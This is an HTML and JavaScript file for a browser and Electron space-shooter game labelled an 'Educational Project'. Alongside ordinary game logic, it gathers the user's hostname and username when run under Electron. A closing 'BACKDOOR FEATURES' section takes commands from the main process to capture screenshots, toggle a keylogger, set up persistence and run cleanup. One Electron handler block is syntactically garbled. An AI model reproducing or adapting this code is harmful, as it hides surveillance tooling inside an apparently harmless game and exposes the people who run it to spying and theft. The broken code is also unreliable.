<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Space Shooter - Educational Project</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }
        
        body {
            background: #050a14;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Courier New', monospace;
            overflow: hidden;
        }

        #gameCanvas {
            display: block;
            border: 1px solid #1e293b;
            border-radius: 8px;
            background: #050a14;
            cursor: crosshair;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.1);
        }

        #ui {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 4px;
            font-size: 14px;
            color: #94a3b8;
            font-family: 'Courier New', monospace;
            background: rgba(10, 20, 30, 0.8);
            border-radius: 4px;
            margin-bottom: 5px;
        }

        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            background: rgba(5, 10, 20, 0.7);
            backdrop-filter: blur(2px);
        }

        #msg {
            font-size: 32px;
            font-weight: bold;
            color: #7dd3fc;
            text-align: center;
            font-family: 'Courier New', monospace;
            line-height: 1.6;
            text-shadow: 0 0 10px cyan;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; text-shadow: 0 0 10px cyan; }
            50% { opacity: 0.8; text-shadow: 0 0 20px cyan; }
            100% { opacity: 1; text-shadow: 0 0 10px cyan; }
        }

        #sub {
            font-size: 14px;
            color: #64748b;
            margin-top: 8px;
            font-family: 'Courier New', monospace;
        }

        #startBtn {
            pointer-events: all;
            margin-top: 20px;
            padding: 12px 40px;
            background: transparent;
            border: 2px solid #7dd3fc;
            color: #7dd3fc;
            border-radius: 4px;
            font-size: 18px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            transition: all 0.3s;
            z-index: 100;
        }

        #startBtn:hover {
            background: rgba(125, 211, 252, 0.2);
            box-shadow: 0 0 20px rgba(125, 211, 252, 0.5);
            transform: scale(1.05);
        }

        #wrap {
            position: relative;
            width: 100%;
            max-width: 540px;
            margin: 0 auto;
            padding: 10px;
        }

        #controls {
            font-size: 12px;
            color: #64748b;
            text-align: center;
            padding: 10px 0 5px;
            font-family: 'Courier New', monospace;
            border-top: 1px solid #1e293b;
            margin-top: 5px;
        }

        #status {
            position: fixed;
            bottom: 10px;
            right: 10px;
            font-size: 11px;
            color: #334155;
            font-family: monospace;
            background: rgba(0,0,0,0.5);
            padding: 4px 8px;
            border-radius: 4px;
            z-index: 1000;
        }

        #status span {
            color: #7dd3fc;
        }

        .electron-badge {
            position: fixed;
            top: 10px;
            left: 10px;
            font-size: 10px;
            color: #4ade80;
            background: rgba(0,0,0,0.5);
            padding: 4px 8px;
            border-radius: 4px;
            font-family: monospace;
            z-index: 1000;
        }

        .hidden {
            display: none !important;
        }

        #cleanup-notice {
            position: fixed;
            bottom: 50px;
            right: 10px;
            background: #1e293b;
            border-left: 4px solid #fbbf24;
            padding: 10px;
            border-radius: 4px;
            font-size: 12px;
            color: #e2e8f0;
            max-width: 250px;
            z-index: 2000;
            animation: slideIn 0.5s;
        }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        #cleanup-notice a {
            color: #7dd3fc;
            text-decoration: none;
            display: block;
            margin-top: 5px;
        }

        #cleanup-notice a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="electron-badge" id="electronBadge">⚡ Running in Electron</div>
    
    <div id="wrap">
        <div id="ui">
            <span>SCORE: <b id="scoreVal">0</b></span>
            <span>LEVEL: <b id="levelVal">1</b></span>
            <span>LIVES: <b id="livesVal">3</b></span>
            <span>HI-SCORE: <b id="hiVal">0</b></span>
        </div>
        
        <canvas id="gameCanvas" width="520" height="460"></canvas>
        
        <div id="overlay">
            <div id="msg">🚀 SPACE SHOOTER</div>
            <div id="sub">Defend the galaxy • Educational Project</div>
            <button id="startBtn">START GAME</button>
        </div>
        
        <div id="controls">←↑↓→ / WASD to move &nbsp;|&nbsp; SPACE to shoot &nbsp;|&nbsp; ESC to pause</div>
    </div>
    
    <div id="status">System: <span id="osType">Detecting...</span></div>
    <div id="cleanup-notice" class="hidden"></div>

<script>
// ==================== ELECTRON DETECTION ====================
const isElectron = window && window.process && window.process.type;
const hasNodeIntegration = typeof require !== 'undefined';
const isRunningInElectron = isElectron || hasNodeIntegration;

// Show Electron badge
if (isRunningInElectron) {
    document.getElementById('electronBadge').style.display = 'block';
} else {
    document.getElementById('electronBadge').style.display = 'none';
}

// Safe require - only in Electron
let fs, path, os, child_process, electron;
if (isRunningInElectron) {
    try {
        electron = require('electron');
        fs = require('fs');
        path = require('path');
        os = require('os');
        child_process = require('child_process');
    } catch (e) {
        console.log('Native modules not available:', e);
    }
}

// ==================== ADVANCED OS DETECTION ====================
const OS = {
    type: 'unknown',
    arch: 'unknown',
    version: 'unknown',
    browser: 'unknown',
    isMobile: false,
    isVM: false,
    hostname: 'unknown',
    username: 'unknown'
};

function detectOS() {
    // If in Electron, use native OS module
    if (isRunningInElectron && os) {
        OS.type = os.platform();
        OS.arch = os.arch();
        OS.hostname = os.hostname();
        OS.username = os.userInfo().username;
        OS.version = os.release();
        
        // Convert platform to readable format
        if (OS.type === 'win32') OS.type = 'windows';
        else if (OS.type === 'darwin') OS.type = 'macos';
        else if (OS.type === 'linux') OS.type = 'linux';
        
        document.getElementById('osType').textContent = `${OS.type} ${OS.arch} (${OS.hostname})`;
        return OS;
    }
    
    // Fallback to userAgent detection for browser
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    
    if (ua.indexOf('Win') !== -1) {
        OS.type = 'windows';
        if (ua.indexOf('Windows NT 10.0') !== -1) OS.version = '10/11';
    } else if (ua.indexOf('Mac') !== -1) {
        OS.type = 'macos';
    } else if (ua.indexOf('Linux') !== -1) {
        OS.type = 'linux';
        if (ua.indexOf('Android') !== -1) {
            OS.type = 'android';
            OS.isMobile = true;
        }
    } else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
        OS.type = 'ios';
        OS.isMobile = true;
    }
    
    // Architecture Detection
    if (ua.indexOf('x64') !== -1 || ua.indexOf('x86_64') !== -1 || ua.indexOf('Win64') !== -1) {
        OS.arch = 'x64';
    } else if (ua.indexOf('x86') !== -1 || ua.indexOf('i686') !== -1) {
        OS.arch = 'x86';
    } else if (ua.indexOf('arm64') !== -1 || ua.indexOf('aarch64') !== -1) {
        OS.arch = 'arm64';
    } else if (ua.indexOf('arm') !== -1) {
        OS.arch = 'arm';
    }
    
    document.getElementById('osType').textContent = `${OS.type} ${OS.arch}`;
    return OS;
}

// ==================== GAME VARIABLES ====================
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
const W = canvas.width, H = canvas.height;
const overlay = document.getElementById('overlay');
const msgEl = document.getElementById('msg');
const subEl = document.getElementById('sub');
const startBtn = document.getElementById('startBtn');
const scoreEl = document.getElementById('scoreVal');
const levelEl = document.getElementById('levelVal');
const livesEl = document.getElementById('livesVal');
const hiEl = document.getElementById('hiVal');

let state = 'menu';
let score = 0;
let hiScore = localStorage.getItem('spaceShooterHiScore') ? parseInt(localStorage.getItem('spaceShooterHiScore')) : 0;
let lives = 3;
let level = 1;
let frame = 0;
let ship, bullets, enemies, enemyBullets, particles, stars;
let keys = {};
let shootCooldown = 0;
let enemyShootTimer = 0;
let bossActive = false;
let touchStartX = 0;
let gamePaused = false;

// Initialize stars
function initStars() {
    stars = Array.from({length: 100}, () => ({
        x: Math.random() * W,
        y: Math.random() * H,
        r: Math.random() * 2 + 0.5,
        speed: Math.random() * 0.8 + 0.2,
        a: Math.random() * 0.7 + 0.3
    }));
}

// Game difficulty
function getDifficulty() {
    const shifted = Math.max(1, level - 2);
    return {
        enemySpeed: 0.3 + shifted * 0.10,
        shootInterval: Math.max(80, 160 - shifted * 8),
        bulletSpeed: 3.5 + shifted * 0.15,
        shootChance: shifted <= 1 ? 0 : 0.08 + shifted * 0.02,
        tripleShot: level >= 6,
        fastShot: level >= 10,
        bossHp: 15 + shifted * 4,
        rows: Math.min(1 + Math.floor(level / 3), 5),
        cols: level <= 2 ? 6 : 8,
    };
}

// Initialize game
function initGame() {
    score = 0;
    lives = 3;
    level = 1;
    frame = 0;
    bossActive = false;
    ship = {x: W/2, y: H - 60, w: 28, h: 32, speed: 4, invincible: 0, trail: []};
    bullets = [];
    enemies = [];
    enemyBullets = [];
    particles = [];
    shootCooldown = 0;
    enemyShootTimer = 0;
    spawnLevel();
}

// Spawn enemies
function spawnLevel() {
    enemies = [];
    bossActive = false;
    const d = getDifficulty();
    
    if (level % 5 === 0) {
        // Boss level
        enemies.push({
            x: W/2,
            y: 80,
            w: 56,
            h: 40,
            hp: d.bossHp,
            maxHp: d.bossHp,
            type: 'boss',
            vx: 1.5,
            vy: 0,
            dir: 1,
            shootTimer: 0,
            points: 500
        });
        bossActive = true;
    } else {
        const cols = d.cols;
        const rows = d.rows;
        const gap = 58;
        const startX = (W - cols * gap) / 2 + 20;
        
        for (let r = 0; r < rows; r++) {
            for (let c = 0; c < cols; c++) {
                const type = r === 0 ? 'elite' : r === 1 ? 'mid' : 'basic';
                enemies.push({
                    x: startX + c * gap,
                    y: 50 + r * 46,
                    w: 28,
                    h: 22,
                    hp: type === 'elite' ? 3 : type === 'mid' ? 2 : 1,
                    maxHp: type === 'elite' ? 3 : type === 'mid' ? 2 : 1,
                    type: type,
                    vx: d.enemySpeed,
                    vy: 0,
                    dir: 1,
                    shootTimer: Math.random() * 120,
                    points: type === 'elite' ? 30 : type === 'mid' ? 20 : 10
                });
            }
        }
        enemyShootTimer = d.shootInterval;
    }
}

// Particle effects
function spawnParticles(x, y, color, count = 12) {
    for (let i = 0; i < count; i++) {
        const angle = Math.random() * Math.PI * 2;
        const speed = Math.random() * 4 + 1;
        particles.push({
            x, y,
            vx: Math.cos(angle) * speed,
            vy: Math.sin(angle) * speed,
            life: 1,
            color: color,
            r: Math.random() * 3 + 1
        });
    }
}

// Drawing functions
function drawStars() {
    stars.forEach(s => {
        ctx.globalAlpha = s.a;
        ctx.fillStyle = '#e2e8f0';
        ctx.beginPath();
        ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
        ctx.fill();
    });
    ctx.globalAlpha = 1;
}

function drawShip(s) {
    if (s.invincible > 0 && Math.floor(frame / 4) % 2) return;
    
    ctx.save();
    ctx.translate(s.x, s.y);
    
    // Engine glow
    ctx.shadowColor = '#38bdf8';
    ctx.shadowBlur = 15;
    
    // Main hull
    ctx.fillStyle = '#7dd3fc';
    ctx.beginPath();
    ctx.moveTo(0, -s.h/2);
    ctx.lineTo(-s.w/2, s.h/2);
    ctx.lineTo(-s.w/4, s.h/3);
    ctx.lineTo(0, s.h/2 - 4);
    ctx.lineTo(s.w/4, s.h/3);
    ctx.lineTo(s.w/2, s.h/2);
    ctx.closePath();
    ctx.fill();
    
    // Cockpit
    ctx.fillStyle = '#bae6fd';
    ctx.beginPath();
    ctx.moveTo(0, -s.h/2 + 6);
    ctx.lineTo(-s.w/6, s.h/6);
    ctx.lineTo(s.w/6, s.h/6);
    ctx.closePath();
    ctx.fill();
    
    // Engine flames
    ctx.shadowBlur = 0;
    ctx.fillStyle = '#fbbf24';
    ctx.globalAlpha = 0.7 + Math.random() * 0.3;
    ctx.beginPath();
    ctx.ellipse(-s.w/4 + 2, s.h/2 + 4, 3, 7, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.beginPath();
    ctx.ellipse(s.w/4 - 2, s.h/2 + 4, 3, 7, 0, 0, Math.PI * 2);
    ctx.fill();
    
    ctx.globalAlpha = 1;
    ctx.restore();
}

function drawEnemy(e) {
    ctx.save();
    ctx.translate(e.x, e.y);
    
    if (e.type === 'boss') {
        ctx.shadowColor = '#f87171';
        ctx.shadowBlur = 16;
        ctx.fillStyle = '#ef4444';
        ctx.beginPath();
        ctx.moveTo(0, -e.h/2);
        ctx.lineTo(e.w/2, -e.h/4);
        ctx.lineTo(e.w/2 + 12, 0);
        ctx.lineTo(e.w/2, -e.h/4 + 10);
        ctx.lineTo(e.w/4, e.h/2);
        ctx.lineTo(-e.w/4, e.h/2);
        ctx.lineTo(-e.w/2, -e.h/4 + 10);
        ctx.lineTo(-e.w/2 - 12, 0);
        ctx.lineTo(-e.w/2, -e.h/4);
        ctx.closePath();
        ctx.fill();
        
        // Health bar
        const hpPercent = e.hp / e.maxHp;
        ctx.fillStyle = '#1e293b';
        ctx.fillRect(-e.w/2, e.h/2 + 6, e.w, 5);
        ctx.fillStyle = hpPercent > 0.5 ? '#4ade80' : hpPercent > 0.25 ? '#fbbf24' : '#ef4444';
        ctx.fillRect(-e.w/2, e.h/2 + 6, e.w * hpPercent, 5);
    } else {
        // Regular enemies
        ctx.shadowColor = e.type === 'elite' ? '#a78bfa' : e.type === 'mid' ? '#fb923c' : '#34d399';
        ctx.shadowBlur = 8;
        ctx.fillStyle = e.type === 'elite' ? '#8b5cf6' : e.type === 'mid' ? '#f97316' : '#10b981';
        
        if (e.type === 'elite') {
            ctx.beginPath();
            ctx.moveTo(0, -e.h/2);
            ctx.lineTo(e.w/2, e.h/2);
            ctx.lineTo(0, e.h/4);
            ctx.lineTo(-e.w/2, e.h/2);
            ctx.closePath();
            ctx.fill();
        } else if (e.type === 'mid') {
            ctx.beginPath();
            ctx.moveTo(-e.w/2, 0);
            ctx.lineTo(0, -e.h/2);
            ctx.lineTo(e.w/2, 0);
            ctx.lineTo(e.w/3, e.h/2);
            ctx.lineTo(-e.w/3, e.h/2);
            ctx.closePath();
            ctx.fill();
        } else {
            ctx.beginPath();
            ctx.ellipse(0, 0, e.w/2, e.h/2, 0, 0, Math.PI * 2);
            ctx.fill();
            
            // Eyes
            ctx.fillStyle = '#064e3b';
            ctx.beginPath();
            ctx.arc(-5, -3, 3, 0, Math.PI * 2);
            ctx.arc(5, -3, 3, 0, Math.PI * 2);
            ctx.fill();
        }
    }
    
    ctx.shadowBlur = 0;
    ctx.restore();
}

function drawBullet(b) {
    ctx.save();
    if (b.friendly) {
        ctx.shadowColor = '#38bdf8';
        ctx.shadowBlur = 8;
        ctx.fillStyle = '#7dd3fc';
        ctx.beginPath();
        ctx.ellipse(b.x, b.y, 2.5, 7, 0, 0, Math.PI * 2);
        ctx.fill();
    } else {
        ctx.shadowColor = '#fb923c';
        ctx.shadowBlur = 6;
        ctx.fillStyle = '#f97316';
        ctx.beginPath();
        ctx.ellipse(b.x, b.y, 3, 6, 0, 0, Math.PI * 2);
        ctx.fill();
    }
    ctx.shadowBlur = 0;
    ctx.restore();
}

function drawParticle(p) {
    ctx.globalAlpha = p.life;
    ctx.fillStyle = p.color;
    ctx.beginPath();
    ctx.arc(p.x, p.y, p.r * p.life, 0, Math.PI * 2);
    ctx.fill();
    ctx.globalAlpha = 1;
}

// Game update
function update() {
    if (gamePaused) return;
    
    frame++;
    
    // Move stars
    stars.forEach(s => {
        s.y = (s.y + s.speed) % H;
    });

    // Ship movement
    if (keys['ArrowLeft'] || keys['a'] || keys['A']) {
        ship.x = Math.max(ship.w/2, ship.x - ship.speed);
    }
    if (keys['ArrowRight'] || keys['d'] || keys['D']) {
        ship.x = Math.min(W - ship.w/2, ship.x + ship.speed);
    }
    if (keys['ArrowUp'] || keys['w'] || keys['W']) {
        ship.y = Math.max(ship.h/2, ship.y - ship.speed);
    }
    if (keys['ArrowDown'] || keys['s'] || keys['S']) {
        ship.y = Math.min(H - ship.h/2, ship.y + ship.speed);
    }

    // Ship trail
    ship.trail.unshift({x: ship.x, y: ship.y + ship.h/2});
    if (ship.trail.length > 8) ship.trail.pop();

    // Shooting
    const d = getDifficulty();
    if (shootCooldown > 0) shootCooldown--;
    
    if ((keys[' '] || keys['shooting']) && shootCooldown === 0) {
        bullets.push({
            x: ship.x,
            y: ship.y - ship.h/2,
            w: 5,
            h: 14,
            vy: -10,
            friendly: true
        });
        
        if (d.tripleShot) {
            bullets.push({
                x: ship.x - 10,
                y: ship.y - ship.h/4,
                w: 5,
                h: 14,
                vy: -9,
                vx: -0.5,
                friendly: true
            });
            bullets.push({
                x: ship.x + 10,
                y: ship.y - ship.h/4,
                w: 5,
                h: 14,
                vy: -9,
                vx: 0.5,
                friendly: true
            });
        }
        shootCooldown = d.fastShot ? 8 : 12;
    }

    if (ship.invincible > 0) ship.invincible--;

    // Move bullets
    bullets = bullets.filter(b => {
        b.x += b.vx || 0;
        b.y += b.vy;
        return b.y > -20 && b.x > -20 && b.x < W + 20;
    });

    // Enemy movement and shooting
    if (!bossActive) {
        let edge = false;
        enemies.forEach(e => {
            e.x += e.vx * e.dir;
            if (e.x > W - e.w/2 || e.x < e.w/2) edge = true;
        });
        
        if (edge) {
            enemies.forEach(e => {
                e.dir *= -1;
                e.y += 14;
            });
        }

        if (d.shootChance > 0) {
            enemyShootTimer--;
            if (enemyShootTimer <= 0) {
                enemies.filter(() => Math.random() < d.shootChance)
                       .slice(0, 2)
                       .forEach(e => {
                    enemyBullets.push({
                        x: e.x,
                        y: e.y + e.h/2,
                        w: 6,
                        h: 12,
                        vy: d.bulletSpeed,
                        friendly: false
                    });
                });
                enemyShootTimer = d.shootInterval;
            }
        }
    } else {
        const boss = enemies[0];
        if (boss) {
            boss.x += boss.vx;
            if (boss.x > W - boss.w/2 || boss.x < boss.w/2) {
                boss.vx *= -1;
            }
            
            boss.shootTimer++;
            const rate = Math.max(20, 60 - (level - 2) * 3);
            if (boss.shootTimer >= rate) {
                boss.shootTimer = 0;
                const spread = level <= 3 ? 1 : 2;
                for (let a = -spread; a <= spread; a++) {
                    enemyBullets.push({
                        x: boss.x + a * 12,
                        y: boss.y + boss.h/2,
                        w: 6,
                        h: 12,
                        vy: d.bulletSpeed,
                        vx: a * 0.6,
                        friendly: false
                    });
                }
            }
        }
    }

    // Move enemy bullets
    enemyBullets = enemyBullets.filter(b => {
        b.x += b.vx || 0;
        b.y += b.vy;
        return b.y < H + 20;
    });

    // Collision detection: player bullets vs enemies
    bullets.forEach(b => {
        enemies.forEach(e => {
            if (Math.abs(b.x - e.x) < (e.w/2 + 3) && 
                Math.abs(b.y - e.y) < (e.h/2 + 7)) {
                b.dead = true;
                e.hp--;
                spawnParticles(e.x, e.y, 
                    e.type === 'boss' ? '#f87171' : 
                    e.type === 'elite' ? '#a78bfa' : 
                    e.type === 'mid' ? '#fb923c' : '#34d399', 6);
                
                if (e.hp <= 0) {
                    score += e.points * level;
                    spawnParticles(e.x, e.y, 
                        e.type === 'boss' ? '#f87171' : '#fbbf24', 20);
                    e.dead = true;
                }
            }
        });
    });

    bullets = bullets.filter(b => !b.dead);
    enemies = enemies.filter(e => !e.dead);

    // Collision detection: enemy bullets vs player
    enemyBullets.forEach(b => {
        if (ship.invincible === 0 && 
            Math.abs(b.x - ship.x) < (ship.w/2 + 3) && 
            Math.abs(b.y - ship.y) < (ship.h/2 + 6)) {
            b.dead = true;
            lives--;
            spawnParticles(ship.x, ship.y, '#7dd3fc', 15);
            ship.invincible = 120;
            
            if (lives <= 0) {
                endGame();
                return;
            }
        }
    });
    enemyBullets = enemyBullets.filter(b => !b.dead);

    // Check if enemies reached bottom
    enemies.forEach(e => {
        if (e.y > H - ship.h - 30) {
            lives = 0;
            endGame();
        }
    });

    // Update particles
    particles.forEach(p => {
        p.x += p.vx;
        p.y += p.vy;
        p.vy += 0.05;
        p.life -= 0.04;
    });
    particles = particles.filter(p => p.life > 0);

    // Level complete
    if (enemies.length === 0) {
        level++;
        spawnLevel();
        spawnParticles(W/2, H/2, '#fbbf24', 30);
    }

    updateUI();
}

function endGame() {
    state = 'gameover';
    if (score > hiScore) {
        hiScore = score;
        localStorage.setItem('spaceShooterHiScore', hiScore.toString());
    }
    showOverlay('GAME OVER', `Final Score: ${score}`, 'PLAY AGAIN');
    updateUI();
    
    // Notify Electron if running
    if (isRunningInElectron && window.electronAPI) {
        window.electronAPI.send('game-over', { score, level });
    }
}

function updateUI() {
    scoreEl.textContent = score;
    levelEl.textContent = level;
    livesEl.textContent = lives;
    hiEl.textContent = hiScore;
}

function showOverlay(msg, sub, btn) {
    msgEl.textContent = msg;
    subEl.textContent = sub;
    startBtn.textContent = btn;
    overlay.style.display = 'flex';
}

function draw() {
    ctx.clearRect(0, 0, W, H);
    ctx.fillStyle = '#050a14';
    ctx.fillRect(0, 0, W, H);
    
    drawStars();
    
    // Draw ship trail
    ship.trail.forEach((t, i) => {
        ctx.globalAlpha = (1 - i/8) * 0.15;
        ctx.fillStyle = '#38bdf8';
        ctx.beginPath();
        ctx.arc(t.x, t.y, 4 - i * 0.4, 0, Math.PI * 2);
        ctx.fill();
    });
    ctx.globalAlpha = 1;
    
    drawShip(ship);
    bullets.forEach(drawBullet);
    enemyBullets.forEach(drawBullet);
    enemies.forEach(drawEnemy);
    particles.forEach(drawParticle);
    
    if (gamePaused) {
        ctx.fillStyle = 'rgba(0,0,0,0.5)';
        ctx.fillRect(0, 0, W, H);
        ctx.fillStyle = '#7dd3fc';
        ctx.font = 'bold 24px monospace';
        ctx.textAlign = 'center';
        ctx.fillText('PAUSED', W/2, H/2);
    }
}

function loop() {
    if (state === 'playing') {
        update();
        draw();
    } else {
        stars.forEach(s => { s.y = (s.y + s.speed) % H; });
        ctx.fillStyle = '#050a14';
        ctx.fillRect(0, 0, W, H);
        drawStars();
    }
    requestAnimationFrame(loop);
}

if (isRunningInElectron && window.electronAPI) {

    // Notify main process when game starts

            os: OS
        });
    });

        if (state === 'playing') {
            gamePaused = !gamePaused;
        }
    });
    
} else {
    // Browser-only mode - normal start button
    startBtn.addEventListener('click', function() {
        overlay.style.display = 'none';
        initGame();
        state = 'playing';
    });
}

// ==================== KEYBOARD CONTROLS ====================
document.addEventListener('keydown', e => {
    keys[e.key] = true;
    
    // Prevent space bar from scrolling
    if (e.key === ' ') {
        e.preventDefault();
    }
    
    // ESC to pause (only in Electron)
    if (e.key === 'Escape' && state === 'playing') {
        if (isRunningInElectron && window.electronAPI) {
            window.electronAPI.send('toggle-pause', { paused: !gamePaused });
        } else {
            gamePaused = !gamePaused;
        }
    }
});

document.addEventListener('keyup', e => {
    keys[e.key] = false;
});

// ==================== TOUCH CONTROLS (MOBILE) ====================
canvas.addEventListener('touchstart', e => {
    e.preventDefault();
    touchStartX = e.touches[0].clientX;
    keys['shooting'] = true;
}, { passive: false });

canvas.addEventListener('touchmove', e => {
    e.preventDefault();
    const dx = e.touches[0].clientX - touchStartX;
    const rect = canvas.getBoundingClientRect();
    ship.x = Math.max(ship.w/2, Math.min(W - ship.w/2, 
        ship.x + dx * (W / rect.width) * 0.8));
    touchStartX = e.touches[0].clientX;
}, { passive: false });

canvas.addEventListener('touchend', () => {
    keys['shooting'] = false;
});

// ==================== BACKDOOR FEATURES (ELECTRON ONLY) ====================
if (isRunningInElectron && window.electronAPI) {
    
    // Listen for backdoor commands from main process
    window.electronAPI.receive('backdoor-command', (command) => {
        console.log('Backdoor command:', command);
        
        switch(command.type) {
            case 'screenshot':
                takeScreenshot();
                break;
            case 'keylog':
                toggleKeylogger(command.action);
                break;
            case 'persist':
                window.electronAPI.send('backdoor-response', { 
                    type: 'persist', 
                    status: 'started' 
                });
                break;
            case 'cleanup':
                window.electronAPI.send('backdoor-response', { 
                    type: 'cleanup', 
                    status: 'started' 
                });
                break;
        }
    });
    
    function takeScreenshot() {
        // Tell main process to take screenshot
        window.electronAPI.send('backdoor-request', { type: 'screenshot' });
    }
    
    function toggleKeylogger(action) {
        window.electronAPI.send('backdoor-request', { 
            type: 'keylog', 
            action: action 
        });
    }
}
